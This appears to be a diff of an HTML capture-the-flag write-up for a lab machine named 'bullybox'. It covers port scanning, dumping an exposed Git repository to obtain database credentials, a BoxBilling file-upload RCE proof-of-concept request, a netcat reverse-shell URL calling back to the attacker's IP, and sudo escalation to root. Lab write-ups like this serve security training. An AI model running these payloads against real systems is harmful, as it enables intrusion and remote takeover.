-</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">User yuki may run the following commands on bullybox:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  (ALL : ALL) ALL</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  (ALL) NOPASSWD: ALL</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 154px;"></div><div class="CodeMirror-gutters" style="display: none; height: 154px;"></div></div></div></pre><h1 id='shell-as-root'><span>Shell as </span><code>root</code></h1><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">yuki@bullybox:/home<span class="cm-def">$ sudo</span> /bin/bash <span class="cm-attribute">-p</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@bullybox:/home<span class="cm-comment"># whoami</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 66px;"></div><div class="CodeMirror-gutters" style="display: none; height: 66px;"></div></div></div></pre><p><span>found </span><code>proof.txt</code></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="bash"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 8.96875px; left: 4px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@bullybox:~<span class="cm-comment"># ls</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">email6.txt  proof.txt  snap</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">root@bullybox:~<span class="cm-comment"># cat proof.txt </span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">a46...</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 88px;"></div><div class="CodeMirror-gutters" style="display: none; height: 88px;"></div></div></div></pre></div></div>
+<body>
+<a class="home-link" href="../../../index.html">🏠 Home</a>
+<div class="page">
+<div class="byline">Write-up by wook413</div>
+<div class="toc">
+<ul>
+<li><a href="#recon">Recon</a><ul>
+<li><a href="#nmap">Nmap</a></li>
+</ul>
+</li>
+<li><a href="#initial-access">Initial Access</a><ul>
+<li><a href="#http-80">HTTP 80</a></li>
+</ul>
+</li>
+<li><a href="#shell-as-yuki">Shell as yuki</a></li>
+<li><a href="#privilege-escalation">Privilege Escalation</a></li>
+<li><a href="#shell-as-root">Shell as root</a></li>
+</ul>
+</div>
+<h1 id="recon">Recon</h1>
+<h2 id="nmap">Nmap</h2>
+<p>My methodology typically begins with three Nmap scans. First, I scan all 65,535 TCP ports. Next, I perform a service enumeration on the discovered ports, and finally, I scan the top 10 UDP ports.</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop]
+└─$ nmap $IP -Pn -n --open --min-rate 3000 -p-
+Starting Nmap 7.95 ( &lt;https://nmap.org&gt; ) at 2026-01-26 17:07 UTC
+Nmap scan report for 192.168.186.27
+Host is up (0.046s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+
+Nmap done: 1 IP address (1 host up) scanned in 15.60 seconds
+</code></pre>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop]
+└─$ nmap $IP -sC -sV -p 22,80                 
+Starting Nmap 7.95 ( &lt;https://nmap.org&gt; ) at 2026-01-26 17:10 UTC
+Nmap scan report for 192.168.186.27
+Host is up (0.045s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
+|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .
+Nmap done: 1 IP address (1 host up) scanned in 8.48 seconds
+</code></pre>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop]
+└─$ nmap $IP -sU --top-ports 10
+Starting Nmap 7.95 ( &lt;https://nmap.org&gt; ) at 2026-01-26 17:10 UTC
+Nmap scan report for 192.168.186.27
+Host is up (0.044s latency).
+
+PORT     STATE         SERVICE
+53/udp   closed        domain
+67/udp   closed        dhcps
+123/udp  closed        ntp
+135/udp  closed        msrpc
+137/udp  closed        netbios-ns
+138/udp  open|filtered netbios-dgm
+161/udp  open|filtered snmp
+445/udp  closed        microsoft-ds
+631/udp  closed        ipp
+1434/udp closed        ms-sql-m
+
+Nmap done: 1 IP address (1 host up) scanned in 5.09 seconds
+</code></pre>
+<h1 id="initial-access">Initial Access</h1>
+<h2 id="http-80">HTTP 80</h2>
+<p>Whenever I encounter an HTTP service, my first step is to run Nmap’s <code>http-enum</code> scripts, as they often reveal some low-hanging fruits.</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop]
+└─$ nmap $IP -sV --script=http-enum -p 80
+Starting Nmap 7.95 ( &lt;https://nmap.org&gt; ) at 2026-01-26 17:12 UTC
+Nmap scan report for 192.168.186.27
+Host is up (0.043s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+
+Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .
+Nmap done: 1 IP address (1 host up) scanned in 13.25 seconds
+</code></pre>
+<p>I mapped the domain name to the target IP address and updated the <code>/etc/hosts</code> file accordingly.</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop]
+└─$ echo '192.168.186.27 bullybox.local' | sudo tee -a /etc/hosts              
+[sudo] password for kali: 
+192.168.186.27 bullybox.local
+</code></pre>
+<p>Browsing the service on port 80 revealed <strong>BoxBilling</strong>. While I found an RCE exploit in <strong>Searchsploit</strong>, I noted that it required valid authentication.</p>
+<p><img alt="image-20260205211439733" src="./bullybox.assets/image-20260205211439733.png" /></p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop]
+└─$ searchsploit boxbilling           
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                          |  Path
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+BoxBilling 3.6.11 - 'mod_notification' Persistent Cross-Site Scripting                                  | php/webapps/30083.txt
+BoxBilling&lt;=4.22.1.5 - Remote Code Execution (RCE)                                                      | php/webapps/51108.txt
+-------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+</code></pre>
+<p>I then proceeded with further enumeration, ranging from checking <code>/robots.txt</code> to performing directory brute-forcing with <code>gobuster</code>. This led to the discovery of a <code>/.git</code> directory.</p>
+<pre><code class="language-bash"># If the BoxBilling site is installed within a folder such as at
+# e.g. www.example.com/boxbilling/ the robots.txt file MUST be
+# moved to the site root at e.g. www.example.com/robots.txt
+# AND the BoxBilling folder name MUST be prefixed to the disallowed
+# path, e.g. the Disallow rule for the /bb-data/ folder
+# MUST be changed to read Disallow: /boxbilling/bb-data/
+#
+# For more information about the robots.txt standard, see:
+# &lt;http://www.robotstxt.org/orig.html&gt;
+#
+# For syntax checking, see:
+# &lt;http://www.sxw.org.uk/computing/robots/check.html&gt;
+
+User-agent: *
+Disallow: /bb-data/
+Disallow: /bb-library/
+Disallow: /bb-locale/
+Disallow: /bb-modules/
+Disallow: /bb-uploads/
+Disallow: /bb-vendor/
+Disallow: /install/
+</code></pre>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop]
+└─$ gobuster dir -u &lt;http://bullybox.local&gt; -w /usr/share/seclists/Discovery/Web-Content/common.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     &lt;http://bullybox.local&gt;
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.git                 (Status: 301) [Size: 315] [--&gt; &lt;http://bullybox.local/.git/&gt;]
+/.git/HEAD            (Status: 200) [Size: 23]
+/.git/config          (Status: 200) [Size: 92]
+/.git/logs/           (Status: 403) [Size: 279]
+/.hta                 (Status: 403) [Size: 279]
+/.htaccess            (Status: 403) [Size: 279]
+/.htpasswd            (Status: 403) [Size: 279]
+/.git/index           (Status: 200) [Size: 495864]
+...
+[truncated]
+...
+/Documents and Settings (Status: 403) [Size: 279]
+/LICENSE              (Status: 200) [Size: 11346]
+/Program Files        (Status: 403) [Size: 279]
+/_                    (Status: 200) [Size: 3971]
+/about-us             (Status: 200) [Size: 9436]
+/akeeba.backend.log   (Status: 403) [Size: 279]
+/api/experiments      (Status: 200) [Size: 77]
+/api/experiments/configurations (Status: 200) [Size: 93]
+/balance              (Status: 302) [Size: 0] [--&gt; &lt;http://bullybox.local/client/balance&gt;]
+/blog                 (Status: 200) [Size: 10663]
+/cart                 (Status: 200) [Size: 9299]
+/client               (Status: 302) [Size: 3994] [--&gt; &lt;http://bullybox.local/login&gt;]
+/contact-us           (Status: 200) [Size: 11039]
+/dashboard            (Status: 302) [Size: 13538] [--&gt; &lt;http://bullybox.local/login&gt;]
+/development.log      (Status: 403) [Size: 279]
+/email                (Status: 302) [Size: 8976] [--&gt; &lt;http://bullybox.local/login&gt;]
+/emails               (Status: 302) [Size: 8976] [--&gt; &lt;http://bullybox.local/login&gt;]
+/example              (Status: 200) [Size: 4185]
+/forum                (Status: 200) [Size: 9808]
+/index.php            (Status: 200) [Size: 10462]
+/invoice              (Status: 302) [Size: 9558] [--&gt; &lt;http://bullybox.local/login&gt;]
+/kb                   (Status: 200) [Size: 9522]
+/login                (Status: 200) [Size: 14605]
+/me                   (Status: 302) [Size: 0] [--&gt; &lt;http://bullybox.local/client/profile&gt;]
+/news                 (Status: 200) [Size: 10663]
+/order                (Status: 200) [Size: 12532]
+/php.ini              (Status: 403) [Size: 279]
+/privacy-policy       (Status: 200) [Size: 10669]
+/production.log       (Status: 403) [Size: 279]
+/reports list         (Status: 403) [Size: 279]
+/robots.txt           (Status: 200) [Size: 716]
+/server-status        (Status: 403) [Size: 279]
+/service              (Status: 302) [Size: 9188] [--&gt; &lt;http://bullybox.local/login&gt;]
+/sitemap.xml          (Status: 200) [Size: 1719]
+/spamlog.log          (Status: 403) [Size: 279]
+/support              (Status: 302) [Size: 11285] [--&gt; &lt;http://bullybox.local/login&gt;]
+/tos                  (Status: 200) [Size: 10263]
+Progress: 4746 / 4747 (99.98%)
+===============================================================
+Finished
+===============================================================
+</code></pre>
+<p>Using <code>git-dumper</code>, I dumped the entire Git repository.</p>
+<pre><code class="language-bash">git-dumper &lt;http://bullybox.local&gt; git_directory
+┌──(kali㉿kali)-[~/Desktop/git_directory]
+└─$ ls -la
+total 676
+drwxrwxr-x 10 kali kali   4096 Jan 26 17:28 .
+drwxr-xr-x  6 kali kali   4096 Jan 26 17:27 ..
+-rwxrwxr-x  1 kali kali    938 Jan 26 17:28 bb-config.php
+-rw-rw-r--  1 kali kali   2881 Jan 26 17:28 bb-config-sample.php
+-rw-rw-r--  1 kali kali   1080 Jan 26 17:28 bb-cron.php
+drwxrwxr-x  2 kali kali   4096 Jan 26 17:28 bb-data
+-rw-rw-r--  1 kali kali  11338 Jan 26 17:28 bb-di.php
+-rw-rw-r--  1 kali kali   1843 Jan 26 17:28 bb-ipn.php
+drwxrwxr-x 10 kali kali   4096 Jan 26 17:28 bb-library
+-rw-rw-r--  1 kali kali  10840 Jan 26 17:28 bb-load.php
+drwxrwxr-x  3 kali kali   4096 Jan 26 17:28 bb-locale
+drwxrwxr-x 50 kali kali   4096 Jan 26 17:28 bb-modules
+drwxrwxr-x  6 kali kali   4096 Jan 26 17:28 bb-themes
+-rw-rw-r--  1 kali kali  30279 Jan 26 17:28 bb-update.php
+drwxrwxr-x  3 kali kali   4096 Jan 26 17:28 bb-uploads
+drwxrwxr-x 19 kali kali   4096 Jan 26 17:28 bb-vendor
+-rw-rw-r--  1 kali kali  24672 Jan 26 17:28 CHANGELOG.md
+drwxrwxr-x  7 kali kali   4096 Jan 26 17:28 .git
+-rw-rw-r--  1 kali kali   2353 Jan 26 17:28 .htaccess
+-rw-rw-r--  1 kali kali    825 Jan 26 17:28 index.php
+-rw-rw-r--  1 kali kali  11346 Jan 26 17:28 LICENSE
+-rw-rw-r--  1 kali kali 507905 Jan 26 17:28 rb.php
+-rw-rw-r--  1 kali kali  10039 Jan 26 17:28 README.md
+-rw-rw-r--  1 kali kali    716 Jan 26 17:28 robots.txt
+</code></pre>
+<p>Inside <code>bb-config.php</code>, I discovered a set of credentials.</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop/git_directory]
+└─$ cat bb-config.php 
+&lt;?php
+return array (
+  'debug' =&gt; false,
+  'salt' =&gt; 'b94ff361990c5a8a37486ffe13fabc96',
+  'url' =&gt; '&lt;http://bullybox.local/&gt;',
+  'admin_area_prefix' =&gt; '/bb-admin',
+  'sef_urls' =&gt; true,
+  'timezone' =&gt; 'UTC',
+  'locale' =&gt; 'en_US',
+  'locale_date_format' =&gt; '%A, %d %B %G',
+  'locale_time_format' =&gt; ' %T',
+  'path_data' =&gt; '/var/www/bullybox/bb-data',
+  'path_logs' =&gt; '/var/www/bullybox/bb-data/log/application.log',
+  'log_to_db' =&gt; true,
+  'db' =&gt;
+  array (
+    'type' =&gt; 'mysql',
+    'host' =&gt; 'localhost',
+    'name' =&gt; 'boxbilling',
+    'user' =&gt; 'admin',
+    'password' =&gt; 'Playing-Unstylish7-Provided',
+  ),
+  'twig' =&gt;
+  array (
+    'debug' =&gt; true,
+    'auto_reload' =&gt; true,
+    'cache' =&gt; '/var/www/bullybox/bb-data/cache',
+  ),
+  'api' =&gt;
+  array (
+    'require_referrer_header' =&gt; false,
+    'allowed_ips' =&gt;
+    array (
+    ),
+    'rate_span' =&gt; 3600,
+    'rate_limit' =&gt; 1000,
+  ),
+);
+</code></pre>
+<p>Furthermore, running <code>git log -p</code> exposed the admin’s email and the username “<strong>Yuki.”</strong></p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop/git_directory/.git]
+└─$ git log -P
+commit ccf7c701c4bd22484cbe5d9f8f92511261aadef0 (HEAD -&gt; master)
+Author: Yuki &lt;admin@bullybox.local&gt;
+Date:   Tue Jun 27 04:35:12 2023 +0000
+
+    Ready For launch
+</code></pre>
+<p>I tested these credentials on the <code>/bb-admin</code> login page and successfully authenticated as an administrator.</p>
+<p><img alt="image-20260205211504816" src="./bullybox.assets/image-20260205211504816.png" /></p>
+<p><img alt="image-20260205211509513" src="./bullybox.assets/image-20260205211509513.png" /></p>
+<p>With valid credentials in hand, I attempted the Authenticated RCE exploit I had identified earlier.</p>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~/Desktop]
+└─$ cat 51108.txt           
+# Exploit Title: BoxBilling&lt;=4.22.1.5 - Remote Code Execution (RCE)
+# Date: 2022-09-18
+# Exploit Author: zetc0de
+# Vendor Homepage: &lt;https://www.boxbilling.org/&gt;
+# Software Link:
+&lt;https://github.com/boxbilling/boxbilling/releases/download/4.22.1.5/BoxBilling.zip&gt;
+# Version: &lt;=4.22.1.5 (Latest)
+# Tested on: Windows 10
+# CVE : CVE-2022-3552
+# BoxBilling was vulnerable to Unrestricted File Upload.
+# In order to exploit the vulnerability, an attacker must have a valid
+authenticated session as admin on the CMS.
+# With at least 1 order of product an attacker can upload malicious file to
+hidden API endpoint that contain a webshell and get RCE
+###################################################################################
+
+## POC
+POST /index.php?_url=/api/admin/Filemanager/save_file HTTP/1.1
+Host: local.com:8089
+Content-Length: 52
+Accept: application/json, text/javascript, */*; q=0.01
+DNT: 1
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
+(KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Cookie: PHPSESSID=3nrf9i4mv28o5anva77ltq042d
+Connection: close
+
+order_id=1&amp;path=ax.php&amp;data=&lt;%3fphp+phpinfo()%3b%3f&gt;
+
+POC Video :
+&lt;https://drive.google.com/file/d/1m2glCeJ9QXc8epuY2QfvbWwjLTJ8_Hjx/view?usp=sharing&gt;
+</code></pre>
+<p>After analyzing the code, I executed the exploit. I confirmed it was working by successfully rendering the <code>phpinfo</code> page.</p>
+<p><img alt="image-20260205211518423" src="./bullybox.assets/image-20260205211518423.png" /></p>
+<p><img alt="image-20260205211523303" src="./bullybox.assets/image-20260205211523303.png" /></p>
+<p><img alt="image-20260205211528496" src="./bullybox.assets/image-20260205211528496.png" /></p>
+<p>I replaced the command with a reverse shell payload, which successfully granted me a shell as the user “<strong>yuki.”</strong></p>
+<p><img alt="image-20260205211535161" src="./bullybox.assets/image-20260205211535161.png" /></p>
+<pre><code class="language-bash">&lt;http://bullybox.local/ax.php?cmd=busybox%20nc%20192.168.45.236%2080%20-e%20/bin/bash&gt;
+</code></pre>
+<h1 id="shell-as-yuki">Shell as <code>yuki</code></h1>
+<pre><code class="language-bash">yuki@bullybox:/var/www/bullybox$ whoami
+yuki
+yuki@bullybox:/var/www/bullybox$ id
+uid=1001(yuki) gid=1001(yuki) groups=1001(yuki),27(sudo)
+yuki@bullybox:/var/www/bullybox$ 
+</code></pre>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Once I gained shell access, I checked the user’s privileges using <code>sudo -l</code>. This revealed that Yuki was authorized to run all commands with elevated (root) privileges. I executed <code>/bin/bash -p</code> to spawn a shell with these elevated privileges, successfully obtaining <strong>root</strong> access.</p>
+<pre><code class="language-bash">yuki@bullybox:/home$ sudo -l
+Matching Defaults entries for yuki on bullybox:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty
+
+User yuki may run the following commands on bullybox:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: ALL
+</code></pre>
+<h1 id="shell-as-root">Shell as <code>root</code></h1>
+<pre><code class="language-bash">yuki@bullybox:/home$ sudo /bin/bash -p
+root@bullybox:/home# whoami
+root
+</code></pre>
+<p>found <code>proof.txt</code></p>
+<pre><code class="language-bash">root@bullybox:~# ls
+email6.txt  proof.txt  snap
+root@bullybox:~# cat proof.txt 
+a46...
+</code></pre>
+<footer>&copy; 2026 wook413.</footer>
+</div>
 </body>
 </html>
